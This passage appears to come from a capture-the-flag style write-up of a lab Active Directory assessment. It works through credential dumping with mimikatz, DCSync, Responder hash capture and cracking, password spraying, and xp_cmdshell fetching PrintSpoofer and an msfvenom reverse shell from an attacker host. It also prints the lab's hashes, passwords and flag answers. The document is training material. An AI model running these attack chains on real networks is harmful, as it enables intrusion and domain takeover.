    netsh interface portproxy add v4tov4 listenport=59850 listenaddress=0.0.0.0 connectport=5985 connectaddress=172.16.6.50
    ``` 
    Once the port forward is active, we can return to our attacker host and use `evil-winrm` to connect through the web server's forwarded port:

    ```bash
    evil-winrm -i 10.129.100.156 -P 59850 -u svc_sql -p 'lucky7'
    ```
    We can get the flag by typing this:

    ```bash
    *Evil-WinRM* PS C:\> type Users\Administrator\Desktop\flag.txt
    ```
    The answer is `spn$_r0ast1ng_on_@n_0p3n_f1re`.

5. Find cleartext credentials for another domain user. Submit the username as your answer.

    In here, i just noticed that it will be a lot easier if we use rdp instead of evil-wirnm. So i used `netsh` again to do portforwarding for rdp connection.

    ```powershell
    netsh interface portproxy add v4tov4 listenport=33890 listenaddress=0.0.0.0 connectport=3389 connectaddress=172.16.6.50
    ```
    Then we can do rdp from the our attack host.

    ```bash
    xfreerdp /v:10.129.100.156:33890 /u:svc_sql /p:'lucky7' /cert:ignore /dynamic-resolution "/drive:parrotshare,/home/user/parrotshare"
    ```
    I tried to use mimikatz. After transfer it via rdp share, i run it. 
    
    ```powershell
    .\mimikatz.exe
    privilege::debug
    sekurlsa::logonpasswords
    ```
    It gave several account, one of them is `tpetty`. I tried to submit `tpetty` and it is correct.

6. Submit this user's cleartext password.

    Altough it is correct, based on mimikatz output, the password is null. 

    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part I - 2.png>)

    After doing some reseacrh, one of the possible reason is because WDigest is disabled. Here the dteail of it based on gemini.

    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part I - 3.png>)

    So we need to enabled it and restart the computer.

    ```powershell
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\SecurityProviders\WDigest\' -Name 'UseLogonCredential' -Value 1
    shutdown.exe /r /t 0 /f
    ```

    Once we have restarted, we can run mimikatz again.

    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part I - 4.png>)

    Now we have cleartext password. The asnwer is `Sup3rS3cur3D0m@inU2eR`.


7. What attack can this user perform?

    We can solve this by enumerating interesting access for user `tpetty`. In here, i used `PowerView.ps1`.

    ```powershell
    $tpettysid = Convert-NameToSid tpetty
    Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $tpettysid} -Verbose
    ```

    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part I - 5.png>)

    We can see in the `ObjectAceType` section, it has `DS-Replication-Get-Changes`. It is exactly like in the HTB module which can leveraged to perform DCSync Attack. So the answer is `DCSync`.

8. Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01

    By using credential of `tpetty`, we can mimic to get powershell of this user.

    ```powershell
    runas /netonly /user:INLANEFREIGHT\tpetty powershell
    ```
    In the `typetty` shell, we can run mimikatz to get the Administrator hash.

    ```powershell
    .\mimikatz.exe
    privilege::debug
    lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
    ```

    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part I - 6.png>)

    We got NTLM hash, `27dedb1dab4d8545c6e1c66fba077da0`. Now we can use `win-rm` to DC01. But before this, we need to do portforwarding again. To find the IP of `DC01`, we can ping it.

    ```powershell
    ping -n 1 DC01.inlanefreight.local
    ```

    It reveals that the IP of DC01 is `172.16.6.3`. By using this information, we can do portforwarding then.

    ```powershell
    netsh interface portproxy add v4tov4 listenport=59851 listenaddress=0.0.0.0 connectport=5985 connectaddress=172.16.6.3
    ```

    After that we can run `evil-winrm` and read the flag.

    ```powershell
    evil-winrm -i 10.129.80.19 -P 59851 -u Administrator -H '27dedb1dab4d8545c6e1c66fba077da0'
    ```
    The answer is `r3plicat1on_m@st3r!`.

### AD Enumeration & Attacks - Skills Assessment Part II
#### Challenges
1. Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name?

    We can capture the hash by using `responder`.

    ```bash
    sudo responder -I ens224 
    ```

    After that go to /usr/share/responder/logs directory. We will find SMB-NTLMv2*.txt file. In there we can find the user that we searched. The answer is backupagent. The answer is `AB920`.

2. What is this user's cleartext password?

    One of the captured hash is like this.

    ```bash
    AB920::INLANEFREIGHT:e54f4a5bbf72b940:08E60D8A2242489A05CF836E9D47C15B:01010000000000000073FF667B54DC013F2BDE09A16555A200000000020008004B0032005700520001001E00570049004E002D00480041004E005400340058004800480030003400330004003400570049004E002D00480041004E00540034005800480048003000340033002E004B003200570052002E004C004F00430041004C00030014004B003200570052002E004C004F00430041004C00050014004B003200570052002E004C004F00430041004C00070008000073FF667B54DC0106000400020000000800300030000000000000000000000000200000447ECCE9FA8F323B3DAD32E27F6FBB727835F22A7494C4A1FB7FCBB0DB4DA17F0A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000
    ```
    We can save it and crack it by using hashcat.

    ```bash
    hashcat -m 5600 crack /usr/share/wordlists/rockyou.txt
    ```
    The answer is `weasal`.

3. Submit the contents of the C:\flag.txt file on MS01.

    First we need to find IP of MS01. We can do ping sweeping.

    ```bash
    fping -asgq 172.16.6.0/23
    ```
    It gave 4 results. We can use `crackmapexec` to find which one is MS01.

    ```bash
    crackmapexec smb 172.16.7.3 172.16.7.50 172.16.7.60 -u AB920 -p 'weasal'
    ```

    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part II - 1.png>)

    We can see the IP of MS01 is `172.16.7.50`. To retrive the flag, we can connect by using rdp. But before it, we need to do port forwarding first. In our attack host, we can try this command:

    ```bash
    ssh -D 9050 htb-student@10.129.50.99
    ```
    Make sure `/etc/proxychains.conf` has this `socks4 	127.0.0.1 9050`. Then we can rdp from our attack host.

    ```bash
    proxychains xfreerdp /v:172.16.7.50 /u:AB920 /p:'weasal' /cert:ignore /dynamic-resolution "/drive:parrotshare,/home/user/parrotshare"
    ```
    We can explore and get the flag. The answer is `aud1t_gr0up_m3mbersh1ps!`.

4. Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain.

    To solve this, we can use password spraying technique. First, we need to gather valid username.

    ```bash
    sudo crackmapexec smb 172.16.7.3 -u AB920 -p weasal --users | grep 'INLANEFREIGHT.LOCAL' | awk '{print $5}' > valid_users.txt
    ```

    Then we can do password spraying.

    ```bash
    sudo crackmapexec smb 172.16.7.3 -u valid_users.txt -p Welcome1 | grep +
    ```

    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part II - 2.png>)
    
    The answer is `BR086`.

5. What is this user's password?

    Based on the previous image, the answer is `Welcome1`.

6. Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file?

    We need to enumerate DC first.
    
    ```bash
    sudo nmap -A 172.16.7.3
    ```

    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part II - 3.png>)

    We can see that SMB service is running. Then we can enumerate the SMB service.

    ```bash
    crackmapexec smb 172.16.7.3 -u BR086 -p 'Welcome1' --shares
    ```
    One of the share folder is `Department Shares`. We can access that folder by using this command:

    ```bash
    smbclient //172.16.7.3/"Department Shares" -U INLANEFREIGHT/BR086
    ```
    We can find `web.config` file in this path, `\IT\Private\Development`. Then we can get the file by using `get` command.

    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part II - 4.png>)

    We can see the credential in there, `netdb:D@ta_bAse_adm1n!`. The answer is `D@ta_bAse_adm1n!`.

7. Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host.

    We can login to the SQL01 by using `mssqlclient.py`.

    ```bash
    mssqlclient.py netdb:'D@ta_bAse_adm1n!'@172.16.7.60 
    ```

    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part II - 5.png>)

    We can enable `xp_cmdshell` but we cant read the flag. We dont have permission on it. If we check the previllege that we have, we can see that we have `SeImpersonatePrivilege`.

    ```bash
    EXEC xp_cmdshell 'whoami /priv'
    ```

    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part II - 6.png>)

    We can exploit this by using `PrinSpoofer64`. [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe) tricks the Print Spooler service (which runs as SYSTEM) into connecting back to us. Because the service has SeImpersonatePrivilege, our tool can "impersonate" its SYSTEM token and use it to run our shell.exe payload. We can generate `shell.exe` payload by using `msfvenom`.

    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.7.240 LPORT=1335 -f exe -o shell.exe
    ```

    After we transfer `shell.exe` and `PrinSpoofer64.exe`, We can start `msfconsole` in our pivot host to catch the connection.

    ```bash
    msf6 > use exploit/multi/handler
    msf6 exploit(multi/handler) > set LHOST 172.16.7.240
    msf6 exploit(multi/handler) > set LPORT 1335
    msf6 exploit(multi/handler) > run
    ```
    Then, back to our SQL to download and execute it.

    ```SQL
    SQL> EXEC xp_cmdshell 'powershell -c "IWR http://172.16.7.240:8000/PrintSpoofer64.exe -OutFile C:\Windows\Tasks\PrintSpoofer64.exe"'
    SQL> EXEC xp_cmdshell 'powershell -c "IWR http://172.16.7.240:8000/shell.exe -OutFile C:\Windows\Tasks\shell.exe"'
    SQL> EXEC xp_cmdshell 'C:\Windows\Tasks\PrintSpoofer64.exe -c "C:\Windows\Tasks\shell.exe"'
    ```

    If it success, our listener will catch it and spawn meterpreter session.

    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part II - 7.png>)

    The answer is `s3imp3rs0nate_cl@ssic`.

8. Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host.

    Still in the meterpreter session, we can use `kiwi` extension.

    ```bash
    meterpreter > load kiwi
    ```
    Then we can dump SAM.

    ```bash
    meterpreter > lsa_dump_sam
    ```

    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part II - 8.png>)

    We can see the administrator hash, `bdaffbfe64f1fc646a3353be1c2c3c99`. We can use it to login to MS01 by using `evil-winrm`.

    ```bash
    evil-winrm -i 172.16.7.50 -u Administrator -H 'bdaffbfe64f1fc646a3353be1c2c3c99'
    ```
    The answer is `exc3ss1ve_adm1n_r1ights!`.

9. Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What's this user's account name?


    In here, we need [`PowerView.ps1`](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) to get the account with `GenericAll` ActiveDirectoryRights. We can login by using `psexec.py`.

    ```bash
    psexec.py Administrator@172.16.7.50 -hashes 00000000000000000000000000000000:bdaffbfe64f1fc646a3353be1c2c3c99
    ```

    Then we can type `powershell.exe` to get the powershell. In the powershell session, we can type this:

    ```powershell
    Import-Module .\PowerView.ps1
    Get-DomainObjectACL -Identity "Domain Admins" -DomainController 172.16.7.3 | Where-Object { $_.ActiveDirectoryRights -eq "GenericAll" }
    ```

    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part II - 9.png>)

    In there, we can copy the security-identifier to get the account name.

    ```powershell
    Get-DomainUser -Identity S-1-5-21-3327542485-274640656-2609762496-4611 -DomainController 172.16.7.3 | Select-Object samaccountname
    ```
    The answer is `CT059`.

10. Crack this user's password hash and submit the cleartext password as your answer.

    We can solve this by using [`Inveigh.exe`](https://github.com/Kevin-Robertson/Inveigh/releases/download/v2.0.11/Inveigh-net4.6.2-v2.0.11.zip). 

    ```powershell
    .\Inveigh.exe
    ```
    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part II - 10.png>)

    We can see it successfull capture the hash. Then we can crack it by using `hashcat` with mode `5600`.

    ```bash
    hashcat -m 5600  crack /usr/share/wordlists/rockyou.txt
    ```
    The answer is `charlie1`.

11. Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host.

    Based on question no 9, we know that `CT059` has `GenericAll` property. It makes that `CT059` can add itself to the `Domain Admin` group. We can do this by using `PowerView.ps1`.

    ```powershell
    Add-DomainGroupMember -Identity 'Domain Admins' -Members 'CT059' -Credential $cred
    ```

    We can confirm if it success by using this command:

    ```powershell
    Get-DomainGroupMember -Identity "Domain Admins" | Select MemberName
    ```

    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part II - 11.png>)

    Once we confirm it, we can use `psexec.py` from our pivot host to read the flag.

    ```bash
    psexec.py INLANEFREIGHT/CT059:charlie1@172.16.7.3
    ```
    The answer is `acLs_f0r_th3_w1n!`.

12. Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise.

    We can solve this by using `mimikatz` or `msfconsole` with `kiwi` extension. In here, i prefer to use `msfconsole`. So we use `psexec` module.

    ```powershell
    set RHOSTS 172.16.7.3
    set SMBDomain INLANEFREIGHT
    set SMBUser CT059
    set SMBPass charlie1
    set payload windows/x64/meterpreter/reverse_tcp
    set LHOST 172.16.7.240
    set LPORT 4444
    run
    ```
    Once we have meterpreter session, we can do `load kiwi` to use `kiwi` extension. Then we can dump the hash of `krbtgt` account.

    ```powershell
    meterpreter > kiwi_cmd "lsadump::dcsync /user:krbtgt"
    ```

    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part II - 12.png>)

    The answer is `7eba70412d81c1cd030d72a3e8dbe05f`.